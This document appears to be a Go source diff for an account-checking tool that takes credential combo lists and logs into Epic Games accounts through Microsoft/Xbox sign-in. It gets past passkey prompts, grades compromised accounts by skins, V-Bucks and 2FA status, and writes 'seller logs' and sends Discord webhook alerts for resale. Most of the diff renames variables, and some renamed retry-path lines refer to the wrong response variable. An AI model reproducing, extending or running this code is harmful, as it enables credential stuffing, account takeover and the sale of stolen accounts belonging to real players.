@@ -58,8 +58,8 @@ func getProxyClient() *http.Client {
 
 func initDebugLog() {
 	if DebugMode {
-		debugFile, err2 := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err2 == nil {
+		debugFile, err := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err == nil {
 			defer debugFile.Close()
 			sessionHeader := fmt.Sprintf("\n=== DEBUG SESSION STARTED: %s ===\n", time.Now().Format("2006-01-02 15:04:05"))
 			debugFile.WriteString(sessionHeader)
@@ -76,8 +76,8 @@ func debugLog(format string, args ...interface{}) {
 
 		fmt.Print(logEntry)
 
-		debugFile, err2 := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err2 == nil {
+		debugFile, err := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err == nil {
 			defer debugFile.Close()
 			debugFile.WriteString(logEntry)
 		}
@@ -135,8 +135,8 @@ type DebugLogger struct {
 func NewDebugLogger(email, task string) *DebugLogger {
 	//Logs folder creation disabled
 	filename := fmt.Sprintf("%s_%s_debug.log", strings.Split(email, ":")[0], task)
-	file, err2 := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return nil
 	}
 
@@ -176,25 +176,25 @@ func decompressGzip(data []byte) ([]byte, error) {
 		return data, nil
 	}
 
-	reader, err2 := gzip.NewReader(bytes.NewReader(data))
-	if err2 != nil {
-		return data, err2
+	reader, err := gzip.NewReader(bytes.NewReader(data))
+	if err != nil {
+		return data, err
 	}
 	defer reader.Close()
 
 	return io.ReadAll(reader)
 }
 
-func readResponseBody(resp2 *http.Response) (string, error) {
-	bodyBytes, err2 := ioutil.ReadAll(resp2.Body)
-	if err2 != nil {
-		return "", err2
+func readResponseBody(resp *http.Response) (string, error) {
+	bodyBytes, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
 	}
 
-	contentEncoding := resp2.Header.Get("Content-Encoding")
+	contentEncoding := resp.Header.Get("Content-Encoding")
 	if strings.Contains(strings.ToLower(contentEncoding), "gzip") {
-		decompressed, err2 := decompressGzip(bodyBytes)
-		if err2 != nil {
+		decompressed, err := decompressGzip(bodyBytes)
+		if err != nil {
 			return string(bodyBytes), nil
 		}
 		return string(decompressed), nil
@@ -227,7 +227,7 @@ func GetStats() *Stats {
 
 func logResponseToFile(acc, endpoint, content string) {
 	//Logs folder creation disabled
-	filename := fmt.Sprintf("%s_%s_resp2onse.json", strings.Split(acc, ":")[0], endpoint)
+	filename := fmt.Sprintf("%s_%s_resp.log", strings.Split(acc, ":")[0], endpoint)
 	_ = os.WriteFile(filename, []byte(content), 0644)
 }
 
@@ -269,7 +269,7 @@ func (s *Stats) getSessionFolder() string {
 		timestamp := time.Now().Format("20060102_150405")
 		s.sessionFolder = fmt.Sprintf("OmesFN_%s", timestamp)
 		baseDir := filepath.Join("Results", s.sessionFolder)
-		if err2 := os.MkdirAll(baseDir, 0755); err2 != nil {
+		if err := os.MkdirAll(baseDir, 0755); err != nil {
 			s.sessionFolder = fmt.Sprintf("err_%d", time.Now().Unix())
 			baseDir = filepath.Join("Results", s.sessionFolder)
 			_ = os.MkdirAll(baseDir, 0755)
@@ -289,11 +289,9 @@ func (s *Stats) ExportBads(acc, reason string) {
 	FailureReasonsMutex.Unlock()
 }
 
-func (s *Stats) ExportRetries(acc string, resp2onseText string, incrementRetries bool) {
+func (s *Stats) ExportRetries(acc string, respText string, incrementRetries bool) {
 	ExportLock.Lock()
 	defer ExportLock.Unlock()
-
-	// LogWarning(fmt.Sprintf("Retrying %s. Reason: %s", acc, resp2onseText))
 
 	WorkWg.Add(1)
 
@@ -302,13 +300,13 @@ func (s *Stats) ExportRetries(acc string, resp2onseText string, incrementRetries
 	} else {
 		AddToRetries(1)
 		Combos <- acc
-		if resp2onseText == "" {
-			resp2onseText = "No resp2onse"
+		if respText == "" {
+			respText = "No response"
 		}
-		f, err2 := os.OpenFile("error_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err2 == nil {
+		f, err := os.OpenFile("error_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err == nil {
 			defer f.Close()
-			_, _ = f.WriteString(fmt.Sprintf("%s | resp2onse: %s\n", acc, resp2onseText))
+			_, _ = f.WriteString(fmt.Sprintf("%s | response: %s\n", acc, respText))
 		}
 	}
 }
@@ -317,6 +315,12 @@ func (s *Stats) ExportSkins(acc, displayName string, skinCount int, skinsList, e
 	folderID := s.getSessionFolder()
 	AddToCheck(1)
 	DecrementJobs(1)
+
+	// Parse V-Bucks count for categorization
+	vbucksInt := 0
+	if vbucksCount != "" {
+		vbucksInt, _ = strconv.Atoi(vbucksCount)
+	}
 
 	categories := []struct {
 		minSkins   int
@@ -342,21 +346,54 @@ func (s *Stats) ExportSkins(acc, displayName string, skinCount int, skinsList, e
 	outputLine := fmt.Sprintf("Account: %s | Display Name: %s | Skin Count: %d | Epic Email: %s | Has STW: %t | 2FA Status: %s | 2FA Methods: %s | Last Played: %s | PSN: %s | Nintendo: %s | Email Verified: %s | V-Bucks: %s | FA: %s | Skins: %s\n",
 		acc, displayName, skinCount, epicEmail, hasStw, twofaStatus, alternateMethods, lastPlayed, psn, nintendo, emailVerified, vbucksCount, faString, skinsList)
 
-	var categoryFile string
+	// Categorize by skins
+	var skinCategoryFile string
 	for _, cat := range categories {
 		if skinCount >= cat.minSkins && skinCount <= cat.maxSkins {
 			cat.varUpdater(1)
-			categoryFile = filepath.Join("Results", folderID, cat.fileName)
+			skinCategoryFile = filepath.Join("Results", folderID, cat.fileName)
 			break
 		}
 	}
 
-	if categoryFile != "" {
-		f, err2 := os.OpenFile(categoryFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err2 == nil {
+	if skinCategoryFile != "" {
+		f, err := os.OpenFile(skinCategoryFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err == nil {
 			defer f.Close()
 			_, _ = f.WriteString(outputLine)
 		}
+	}
+
+	// Only create V-Bucks files for accounts with 1000+ V-Bucks in vbucks subfolder
+	if vbucksInt >= 1000 {
+		vbucksSubfolder := filepath.Join("Results", folderID, "vbucks")
+		os.MkdirAll(vbucksSubfolder, 0755)
+
+		var vbucksCategoryFile string
+		switch {
+		case vbucksInt >= 10000:
+			vbucksCategoryFile = filepath.Join(vbucksSubfolder, "10k+_vbucks.txt")
+		case vbucksInt >= 5000:
+			vbucksCategoryFile = filepath.Join(vbucksSubfolder, "5k-10k_vbucks.txt")
+		case vbucksInt >= 1000:
+			vbucksCategoryFile = filepath.Join(vbucksSubfolder, "1k-5k_vbucks.txt")
+		}
+
+		if vbucksCategoryFile != "" {
+			f, err := os.OpenFile(vbucksCategoryFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+			if err == nil {
+				defer f.Close()
+				_, _ = f.WriteString(outputLine)
+			}
+		}
+	}
+
+	// Update V-Bucks counters
+	if vbucksInt >= 1000 {
+		AddToVbucks1kPlus(1)
+	}
+	if vbucksInt >= 3000 {
+		AddToVbucks3kPlus(1)
 	}
 
 	sellerLogEntry := fmt.Sprintf("Epic Email: %s | FA: %s | Email Verified: %s | 2FA Methods: %s | V-Bucks: %s | Skin Count: %d | Last Played: %s | PSN Connectable: %s | Nintendo Connectable: %s | Skins: %s",
@@ -379,8 +416,8 @@ func (s *Stats) ExportStats(acc string) {
 
 	for _, fileName := range categories {
 		filePath := filepath.Join("Results", folderID, fileName)
-		content, err2 := os.ReadFile(filePath)
-		if err2 != nil {
+		content, err := os.ReadFile(filePath)
+		if err != nil {
 			continue
 		}
 
@@ -407,14 +444,14 @@ func (s *Stats) ExportSellerLog() {
 	sellerFilePath := filepath.Join("Results", folderID, "seller_log.txt")
 	sortedFilePath := filepath.Join("Results", folderID, "sorted_log.txt")
 
-	sellerFile, err2 := os.OpenFile(sellerFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	sellerFile, err := os.OpenFile(sellerFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return
 	}
 	defer sellerFile.Close()
 
-	sortedFile, err2 := os.OpenFile(sortedFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	sortedFile, err := os.OpenFile(sortedFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return
 	}
 	defer sortedFile.Close()
@@ -435,12 +472,8 @@ func (s *Stats) ExportSellerLog() {
 		}
 	}
 
+	// Only include exclusives and accounts with 100+ skins
 	writeLogSection("Exclusives & Ogs", s.raresAndExclusivesSellerLog)
-	writeLogSection("0 Skins", s.zeroSkinSellerLog)
-	writeLogSection("1+ Skins", s.oneSkinSellerLog)
-	writeLogSection("10+ Skins", s.tenSkinSellerLog)
-	writeLogSection("25+ Skins", s.twentyFiveSkinSellerLog)
-	writeLogSection("50+ Skins", s.fiftySkinSellerLog)
 	writeLogSection("100+ Skins", s.hundredSkinSellerLog)
 	writeLogSection("150+ Skins", s.hundredFiftySkinSellerLog)
 	writeLogSection("200+ Skins", s.twoHundredSkinSellerLog)
@@ -646,23 +679,23 @@ func sendDiscordWebhookForHit(acc, displayName, skinsCountStr, epicEmail, altern
 	}
 }
 
-func (s *Stats) ExportExclusive(acc, displayName, skinsList, epicEmail, alternateMethods, lastPlayed string, totalVbucks int, hasStw bool) {
+func (s *Stats) ExportExclusive(acc, displayName string, skinCount int, epicEmail, alternateMethods, lastPlayed string, totalVbucks int, hasStw bool) {
 	folderID := s.getSessionFolder()
 	filePath := filepath.Join("Results", folderID, "exclusives.txt")
 
-	f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return
 	}
 	defer f.Close()
 
-	line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %s | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
-		acc, displayName, skinsList, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
+	line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %d | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
+		acc, displayName, skinCount, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
 	_, _ = f.WriteString(line)
 
 	// Send Discord webhook for exclusive hits
 	if DiscordWebhookURL != "" {
-		sendDiscordWebhookForExclusive(acc, displayName, skinsList, epicEmail, alternateMethods, lastPlayed, totalVbucks, hasStw)
+		sendDiscordWebhookForExclusive(acc, displayName, fmt.Sprintf("%d Skins", skinCount), epicEmail, alternateMethods, lastPlayed, totalVbucks, hasStw)
 	}
 }
 
@@ -675,8 +708,8 @@ func (s *Stats) ExportHeadless(acc, displayName, epicEmail, alternateMethods, la
 	folderID := s.getSessionFolder()
 	filePath := filepath.Join("Results", folderID, "headless.txt")
 
-	f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return
 	}
 	defer f.Close()
@@ -690,8 +723,8 @@ func (s *Stats) ExportFA(acc, displayName string, skinCount, totalVbucks int, ep
 	folderID := s.getSessionFolder()
 	filePath := filepath.Join("Results", folderID, "fa.txt")
 
-	f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err2 != nil {
+	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
 		return
 	}
 	defer f.Close()
@@ -702,36 +735,34 @@ func (s *Stats) ExportFA(acc, displayName string, skinCount, totalVbucks int, ep
 }
 
 func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, twofaStatus string, skinCount, totalVbucks int, hasStw, isHeadless bool, ogSkinsFound, rareSkinsFound []string) {
-	// Auto-save premium hits - removed for modern UI
-
 	// Send Discord webhook for ALL hits if enabled (including exclusives, headless, etc.)
 	if SendAllHits && DiscordWebhookURL != "" {
 		sendDiscordWebhookForHit(acc, displayName, fmt.Sprintf("%d Skins", skinCount), epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw, twofaStatus)
 	}
 
+	// Export exclusive accounts to separate file
 	if len(ogSkinsFound) > 0 {
-		s.ExportExclusive(acc, displayName, "OG Skins: "+strings.Join(ogSkinsFound, ", "), epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
+		s.ExportExclusive(acc, displayName, skinCount, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
 		sellerLogEntry := fmt.Sprintf("%s | Epic Email: %s | OG Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
 			acc, epicEmail, strings.Join(ogSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
 		s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, sellerLogEntry)
 		AddToRares(1)
-		return
 	}
 
 	if len(rareSkinsFound) > 0 {
-		s.ExportExclusive(acc, displayName, "Exclusive Skins: "+strings.Join(rareSkinsFound, ", "), epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
+		s.ExportExclusive(acc, displayName, skinCount, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
 		sellerLogEntry := fmt.Sprintf("Epic Email: %s | Exclusive Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
 			epicEmail, strings.Join(rareSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
 		s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, acc+" | "+sellerLogEntry)
 		AddToRares(1)
-		return
 	}
 
 	if isHeadless && skinCount >= 2 {
 		s.ExportHeadless(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, skinCount, totalVbucks, hasStw)
-	} else {
-		// Nothing special here anymore - Discord webhook already sent above
 	}
+
+	// ALL valid hits now get processed by ExportSkins for categorization
+	// This ensures no hits are skipped from regular categorization
 }
 
 // Calculate account quality score (0-100)
@@ -802,9 +833,9 @@ type EpicGames struct {
 func CheckAccount(acc string) bool {
 	AddToCpm(1)
 
-	jar, err2 := cookiejar.New(nil)
-	if err2 != nil {
-		LogError(fmt.Sprintf("Failed to create cookie jar for %s: %v", acc, err2))
+	jar, err := cookiejar.New(nil)
+	if err != nil {
+		LogError(fmt.Sprintf("Failed to create cookie jar for %s: %v", acc, err))
 		GetStats().ExportRetries(acc, "failed to create cookie jar", true)
 		return false
 	}
@@ -888,8 +919,8 @@ func CheckAccount(acc string) bool {
 			req.Header.Set(key, value)
 		}
 
-		authResp, err2 = session.Do(req)
-		if err2 == nil && authResp.StatusCode == 200 {
+		authResp, err = session.Do(req)
+		if err == nil && authResp.StatusCode == 200 {
 			break
 		}
 
@@ -898,23 +929,22 @@ func CheckAccount(acc string) bool {
 			return false
 		}
 
-		if strings.Contains(err2.Error(), "ConnectionError") || strings.Contains(err2.Error(), "Timeout") {
+		if strings.Contains(err.Error(), "ConnectionError") || strings.Contains(err.Error(), "Timeout") {
 			time.Sleep(2 * time.Second)
 			continue
 		}
 
-		LogError(fmt.Sprintf("Error during authentication for %s: %v", acc, err2))
+		LogError(fmt.Sprintf("Error during authentication for %s: %v", acc, err))
 		continue
 	}
 
 	defer authResp.Body.Close()
 
-	authBody, err2 = readResponseBody(authResp)
-	if err2 != nil {
-		LogError(fmt.Sprintf("Error reading auth resp2onse body for %s: %v", acc, err2))
+	authBody, err = readResponseBody(authResp)
+	if err != nil {
+		LogError(fmt.Sprintf("Error reading auth response body for %s: %v", acc, err))
 		return false
 	}
-
 
 	debugLog("Microsoft authentication response for %s: %s", acc, authBody)
 
@@ -938,60 +968,60 @@ func CheckAccount(acc string) bool {
 
 				ruURL = formURL[ruValueStart:ruValueEnd]
 
-				decodedRU, err2 := url.QueryUnescape(ruURL)
-				if err2 != nil {
+				decodedRU, err := url.QueryUnescape(ruURL)
+				if err != nil {
 					decodedRU = ruURL
 				}
 
 				finalRU := decodedRU + "&res=success"
 
-					resp2, err2 := session.Get(finalRU)
-					if err2 != nil {
-						// fmt.Println("Error on cancel/passkey GET:", err2)
-					} else {
-						defer resp2.Body.Close()
+				resp, err := session.Get(finalRU)
+				if err != nil {
+					// fmt.Println("Error on cancel/passkey GET:", err)
+				} else {
+					defer resp.Body.Close()
 
-						resp2onseBody, err2 := readResponseBody(resp2)
-						if err2 != nil {
-							// fmt.Println("Error reading cancel/passkey resp2onse:", err2)
-							resp2onseBody = ""
-						}
-
-						if strings.Contains(strings.ToLower(resp2onseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(resp2onseBody), "recover?mkt=") {
-							LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
-							GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
-							return false
-						}
-
-						// fmt.Println("Response from cancel/passkey GET:", resp2onseBody)
-						logResponseToFile(acc, "cancel?mkt_GET", resp2onseBody)
+					respBody, err := readResponseBody(resp)
+					if err != nil {
+						// fmt.Println("Error reading cancel/passkey response:", err)
+						respBody = ""
 					}
+
+					if strings.Contains(strings.ToLower(respBody), "abuse?mkt=") || strings.Contains(strings.ToLower(respBody), "recover?mkt=") {
+						LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
+						GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
+						return false
+					}
+
+					// fmt.Println("Response from cancel/passkey GET:", respBody)
+					logResponseToFile(acc, "cancel?mkt_GET", respBody)
+				}
 			} else {
-				decodedFormURL, err2 := url.QueryUnescape(formURL)
-				if err2 != nil {
+				decodedFormURL, err := url.QueryUnescape(formURL)
+				if err != nil {
 					decodedFormURL = formURL
 				}
 
-				resp2, err2 := session.Get(decodedFormURL)
-				if err2 != nil {
-					fmt.Println("Error on cancel/passkey POST:", err2)
+				resp, err := session.Get(decodedFormURL)
+				if err != nil {
+					fmt.Println("Error on cancel/passkey POST:", err)
 				} else {
-					defer resp2.Body.Close()
+					defer resp.Body.Close()
 
-					resp2onseBody, err2 := readResponseBody(resp2)
-					if err2 != nil {
-						fmt.Println("Error reading cancel/passkey resp2onse:", err2)
-						resp2onseBody = ""
+					respBody, err := readResponseBody(resp)
+					if err != nil {
+						fmt.Println("Error reading cancel/passkey response:", err)
+						respBody = ""
 					}
 
-					if strings.Contains(strings.ToLower(resp2onseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(resp2onseBody), "recover?mkt=") {
+					if strings.Contains(strings.ToLower(respBody), "abuse?mkt=") || strings.Contains(strings.ToLower(respBody), "recover?mkt=") {
 						LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey POST, marking as bad", acc))
 						GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey POST")
 						return false
 					}
 
-					fmt.Println("Response from cancel/passkey POST:", resp2onseBody)
-					logResponseToFile(acc, "cancel?mkt_POST", resp2onseBody)
+					fmt.Println("Response from cancel/passkey POST:", respBody)
+					logResponseToFile(acc, "cancel?mkt_POST", respBody)
 				}
 			}
 		}
@@ -1019,22 +1049,22 @@ func CheckAccount(acc string) bool {
 
 				ruURL = formURL[ruValueStart:ruValueEnd]
 
-				decodedRU, err2 := url.QueryUnescape(ruURL)
-				if err2 != nil {
+				decodedRU, err := url.QueryUnescape(ruURL)
+				if err != nil {
 					decodedRU = ruURL
 				}
 
 				finalRU := decodedRU + "&res=success"
 
-				resp2, err2 := session.Get(finalRU)
-				if err2 != nil {
-					// fmt.Println("Error on cancel/passkey GET:", err2)
+				resp, err := session.Get(finalRU)
+				if err != nil {
+					// fmt.Println("Error on cancel/passkey GET:", err)
 				} else {
-					defer resp2.Body.Close()
+					defer resp.Body.Close()
 
-					responseBody, err2 := readResponseBody(resp2)
-					if err2 != nil {
-						// fmt.Println("Error reading cancel/passkey response:", err2)
+					responseBody, err := readResponseBody(resp)
+					if err != nil {
+						// fmt.Println("Error reading cancel/passkey response:", err)
 						responseBody = ""
 					}
 
@@ -1048,20 +1078,20 @@ func CheckAccount(acc string) bool {
 					logResponseToFile(acc, "cancel?mkt_GET", responseBody)
 				}
 			} else {
-				decodedFormURL, err2 := url.QueryUnescape(formURL)
-				if err2 != nil {
+				decodedFormURL, err := url.QueryUnescape(formURL)
+				if err != nil {
 					decodedFormURL = formURL
 				}
 
-				resp2, err2 := session.Get(decodedFormURL)
-				if err2 != nil {
-					// fmt.Println("Error on cancel/passkey GET:", err2)
+				resp, err := session.Get(decodedFormURL)
+				if err != nil {
+					// fmt.Println("Error on cancel/passkey GET:", err)
 				} else {
-					defer resp2.Body.Close()
+					defer resp.Body.Close()
 
-					responseBody, err2 := readResponseBody(resp2)
-					if err2 != nil {
-						// fmt.Println("Error reading cancel/passkey response:", err2)
+					responseBody, err := readResponseBody(resp)
+					if err != nil {
+						// fmt.Println("Error reading cancel/passkey response:", err)
 						responseBody = ""
 					}
 
@@ -1089,7 +1119,7 @@ func CheckAccount(acc string) bool {
 	}
 
 	if authResp == nil || authResp.StatusCode != 200 {
-		LogError(fmt.Sprintf("Microsoft authentication failed for %s - no valid resp2onse", acc))
+		LogError(fmt.Sprintf("Microsoft authentication failed for %s - no valid response", acc))
 		GetStats().ExportBads(acc, "Microsoft authentication failed")
 		return false
 	}
@@ -1100,8 +1130,8 @@ func CheckAccount(acc string) bool {
 	}
 
 	if proxy != "" {
-		proxyURL, err2 := url.Parse(proxy)
-		if err2 == nil {
+		proxyURL, err := url.Parse(proxy)
+		if err == nil {
 			transport.Proxy = http.ProxyURL(proxyURL)
 		}
 	}
@@ -1126,21 +1156,21 @@ func CheckAccount(acc string) bool {
 		}
 		defer func() { epicGames.client.CheckRedirect = nil }()
 
-		resp22, err22 := epicGames.client.Get(xboxAuthURL)
-		if err22 != nil {
-			if resp22 == nil {
-				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err22))
+		resp, err := epicGames.client.Get(xboxAuthURL)
+		if err != nil {
+			if resp == nil {
+				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err))
 				GetStats().ExportBads(acc, "Failed to get Xbox token - initial GET failed")
 				return false
 			}
 		}
-		defer resp22.Body.Close()
+		defer resp.Body.Close()
 
-		location, err2 := resp22.Location()
-		if err2 != nil {
-			body, err2Read := readResponseBody(resp22)
-			if err2Read != nil {
-				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2Read))
+		location, err := resp.Location()
+		if err != nil {
+			body, errRead := readResponseBody(resp)
+			if errRead != nil {
+				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, errRead))
 				GetStats().ExportBads(acc, "Failed to get Xbox token - error reading response body")
 				return false
 			}
@@ -1151,16 +1181,16 @@ func CheckAccount(acc string) bool {
 			} else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
 				if ru := Parse(body, "ru=", "\""); ru != "" {
 					unquotedRU, _ := url.QueryUnescape(ru)
-					resp22, err2 = epicGames.client.Get(unquotedRU)
-					if err2 != nil && resp22 == nil {
-						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
+					resp, err = epicGames.client.Get(unquotedRU)
+					if err != nil && resp == nil {
+						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err))
 						GetStats().ExportBads(acc, "Failed to get Xbox token - ru GET request failed")
 						return false
 					}
-					defer resp22.Body.Close()
-					location, err2 = resp22.Location()
-					if err2 != nil {
-						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
+					defer resp.Body.Close()
+					location, err = resp.Location()
+					if err != nil {
+						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err))
 						GetStats().ExportBads(acc, "Failed to get Xbox token - no location from ru redirect")
 						return false
 					}
@@ -1192,8 +1222,8 @@ func CheckAccount(acc string) bool {
 	}
 
 	if proxy != "" {
-		proxyURL, err2 := url.Parse(proxy)
-		if err2 == nil {
+		proxyURL, err := url.Parse(proxy)
+		if err == nil {
 			transport.Proxy = http.ProxyURL(proxyURL)
 		}
 	}
@@ -1210,7 +1240,7 @@ func CheckAccount(acc string) bool {
 
 	var xboxAuthURL string = "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
 	var location *url.URL
-	var resp22 *http.Response
+	var resp *http.Response
 
 	epicGamesRetry.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
 		return http.ErrUseLastResponse
@@ -1218,24 +1248,24 @@ func CheckAccount(acc string) bool {
 	defer func() { epicGamesRetry.client.CheckRedirect = nil }()
 
 	var resp2 *http.Response
-	resp2, err2 = epicGamesRetry.client.Get(xboxAuthURL)
-	if err2 != nil {
+	resp2, err = epicGamesRetry.client.Get(xboxAuthURL)
+	if err != nil {
 		if resp2 == nil {
-			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err))
 			GetStats().ExportBads(acc, "Failed to get Xbox token for retry")
 			return false
 		}
 	}
 	defer resp2.Body.Close()
 
-	location, err2 = resp2.Location()
-	if err2 != nil {
+	location, err = resp2.Location()
+	if err != nil {
 		var body string
-		var err2Read error
-		body, err2Read = readResponseBody(resp2)
-		if err2Read != nil {
-			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2Read))
-			GetStats().ExportBads(acc, "Failed to get Xbox token for retry - error reading resp2onse body")
+		var errRead error
+		body, errRead = readResponseBody(resp2)
+		if errRead != nil {
+			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, errRead))
+			GetStats().ExportBads(acc, "Failed to get Xbox token for retry - error reading response body")
 			return false
 		}
 		if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
@@ -1245,16 +1275,16 @@ func CheckAccount(acc string) bool {
 		} else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
 			if ru := Parse(body, "ru=", "\""); ru != "" {
 				unquotedRU, _ := url.QueryUnescape(ru)
-				resp2, err2 = epicGamesRetry.client.Get(unquotedRU)
-				if err2 != nil && resp2 == nil {
-					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+				resp2, err = epicGamesRetry.client.Get(unquotedRU)
+				if err != nil && resp2 == nil {
+					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err))
 					GetStats().ExportBads(acc, "Failed to get Xbox token for retry - ru GET request failed")
 					return false
 				}
-				defer resp22.Body.Close()
-				location, err2 = resp22.Location()
-				if err2 != nil {
-					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+				defer resp.Body.Close()
+				location, err = resp.Location()
+				if err != nil {
+					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err))
 					GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location from ru redirect")
 					return false
 				}
@@ -1290,24 +1320,24 @@ func CheckAccount(acc string) bool {
 	req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
 
 	for i := 0; i < 3; i++ {
-		resp2, err2 = http.DefaultClient.Do(req)
-		if err2 == nil {
+		resp2, err = http.DefaultClient.Do(req)
+		if err == nil {
 			break
 		}
 		time.Sleep(5 * time.Second)
 	}
-	if err2 != nil {
-		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-		GetStats().ExportRetries(acc, err2.Error(), true)
+	if err != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err))
+		GetStats().ExportRetries(acc, err.Error(), true)
 		return false
 	}
 	defer resp2.Body.Close()
 
 	var body string
-	body, err2 = readResponseBody(resp2)
-	if err2 != nil {
-		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-		GetStats().ExportRetries(acc, err2.Error(), true)
+	body, err = readResponseBody(resp2)
+	if err != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err))
+		GetStats().ExportRetries(acc, err.Error(), true)
 		return false
 	}
 	bodyStr := body
@@ -1334,9 +1364,9 @@ func CheckAccount(acc string) bool {
 		CurrentAccountHeadless = true
 	} else {
 		var result map[string]interface{}
-		if err2 := json.Unmarshal([]byte(bodyStr), &result); err2 != nil {
-			LogError(fmt.Sprintf("Failed to parse Xbox exchange response for %s: %v", acc, err2))
-			GetStats().ExportRetries(acc, "Failed to parse Xbox exchange resp2onse", true)
+		if err := json.Unmarshal([]byte(bodyStr), &result); err != nil {
+			LogError(fmt.Sprintf("Failed to parse Xbox exchange response for %s: %v", acc, err))
